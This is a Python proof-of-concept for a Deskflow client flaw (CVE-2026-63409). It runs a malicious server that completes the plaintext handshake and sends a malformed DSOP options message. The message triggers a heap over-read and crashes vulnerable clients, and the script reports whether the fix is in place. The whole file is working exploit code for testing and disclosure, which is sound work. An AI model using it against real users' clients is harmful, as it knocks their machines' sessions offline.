#!/usr/bin/env python3
"""
CVE-2026-63409 - Deskflow client DSOP options odd-length out-of-bounds read.

A malicious or compromised server can crash a connected client by sending a
DSOP (set-options) message whose option vector holds an ODD number of 32-bit
words. src/lib/client/ServerProxy.cpp::setOptions treats the vector as a flat
list of (id, value) pairs and walks it two words at a time, reading
options[i + 1] without first checking the length is even. A one-element vector
carrying option id "HART" (kOptionHeartbeat) enters the heartbeat branch and
reads options[1] - one word past the end of the buffer - inside
setKeepAliveRate(1.0e-3 * options[i + 1]). Screen::setOptions has the same
pair assumption for the half-duplex ids.

This PoC is the malicious server: it listens, speaks the plaintext v1.8
handshake ("Barrier" hello, then reads the client's helloback), then pushes the
malformed DSOP:

    44 53 4f 50 00 00 00 01 48 41 52 54     DSOP | len=1 | "HART", no value

Detection: the odd read is a 4-byte heap over-read. A release build usually
reads adjacent heap and limps on, so run the client built with AddressSanitizer
to see it deterministically - ASan aborts on the read and drops the connection
(VULNERABLE). A fixed client rejects the odd-length vector and keeps the
connection alive (PASS). Prereq: point a client at this host with tls disabled,
since the handshake here is plaintext.
"""

import argparse
import socket
import struct
import sys
import time

PROTO_MAJOR, PROTO_MINOR = 1, 8
HELLO = b"Barrier"
OPTION_HEARTBEAT = b"HART"


def frame(payload):
    return struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock):
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, size) if size else b""


def handshake(conn):
    conn.sendall(frame(HELLO + struct.pack(">HH", PROTO_MAJOR, PROTO_MINOR)))
    helloback = recv_packet(conn)
    if len(helloback) < 7 or helloback[:7] not in (b"Barrier", b"Synergy"):
        raise RuntimeError(f"unexpected helloback: {helloback!r}")
    return helloback


def malformed_dsop():
    # "HART" (kOptionHeartbeat) is the one option id whose branch in
    # ServerProxy::setOptions dereferences options[i + 1], so a single-element
    # vector makes it read the absent paired value one word past the buffer.
    return b"DSOP" + struct.pack(">I", 1) + OPTION_HEARTBEAT


def client_survived(conn, window=3.0):
    conn.settimeout(0.5)
    deadline = time.monotonic() + window
    while time.monotonic() < deadline:
        try:
            data = conn.recv(4096)
        except socket.timeout:
            continue
        except OSError:
            return False
        if not data:
            return False
    return True


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1", help="address to bind the malicious server on")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--timeout", type=float, default=60.0,
                    help="seconds to wait for a client to connect")
    args = ap.parse_args()

    print(f"CVE-2026-63409 - dsop options odd-length out-of-bounds read")
    print(f"malicious server on {args.host}:{args.port}")
    print(f"start a deskflow client (tls disabled) pointed at this address\n")

    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(1)
    listener.settimeout(args.timeout)

    print("[*] waiting for client")
    try:
        conn, peer = listener.accept()
    except socket.timeout:
        print("[ERROR] no client connected within the timeout")
        return 2
    finally:
        listener.close()

    with conn:
        conn.settimeout(10.0)
        try:
            helloback = handshake(conn)
        except (OSError, RuntimeError, ConnectionError) as e:
            print(f"[ERROR] handshake failed: {e}")
            return 2
        print(f"client connected from {peer[0]}:{peer[1]}, helloback: {len(helloback)} bytes")

        conn.sendall(frame(malformed_dsop()))
        print("sent malformed dsop, vector length 1, option id heartbeat, no value")

        alive = client_survived(conn)

    if alive:
        print("[PASS] client survived - odd-length options rejected, fix in place")
        return 0
    print("[FAIL] client dropped connection - VULNERABLE (CVE-2026-63409)")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
